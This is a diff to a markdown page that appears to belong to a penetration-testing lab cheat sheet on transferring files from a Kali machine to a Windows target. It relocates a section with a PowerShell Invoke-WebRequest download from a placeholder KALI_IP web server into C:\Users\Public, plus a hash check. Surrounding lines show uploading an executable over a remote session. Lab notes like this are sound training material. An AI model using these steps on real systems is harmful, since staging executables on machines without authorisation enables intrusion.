@@ -21,19 +21,6 @@ Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=linux-to-windows) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Download a served file from Kali to Windows
-
-**Run in:** Windows PowerShell. **Requires:** Kali is serving the intended directory with python3 -m http.server 8000; Windows can reach that address and write the destination.
-
-```powershell
-Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.bin' -OutFile 'C:\Users\Public\file.bin'
-Get-FileHash 'C:\Users\Public\file.bin' -Algorithm SHA256
-```
-
-**What the result establishes:** Confirm the downloaded object is the intended file rather than an HTML error/login page, then compare its hash.
-
-**Next check:** Check the requested URL and server log, then compare the hash to the original before using the file.
-
 ## 1. Kali — from the folder containing the file
 
 **Kali**
@@ -60,6 +47,19 @@ Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\U
 upload ./file.exe C:\Users\Public\file.exe
 ```
 
+## Download a served file from Kali to Windows
+
+**Run in:** Windows PowerShell. **Requires:** Kali is serving the intended directory with python3 -m http.server 8000; Windows can reach that address and write the destination.
+
+```powershell
+Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.bin' -OutFile 'C:\Users\Public\file.bin'
+Get-FileHash 'C:\Users\Public\file.bin' -Algorithm SHA256
+```
+
+**What the result establishes:** Confirm the downloaded object is the intended file rather than an HTML error/login page, then compare its hash.
+
+**Next check:** Check the requested URL and server log, then compare the hash to the original before using the file.
+
 ## If it fails
 
 | Symptom | Check |
@@ -71,6 +71,8 @@ upload ./file.exe C:\Users\Public\file.exe
 - [Official documentation 1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
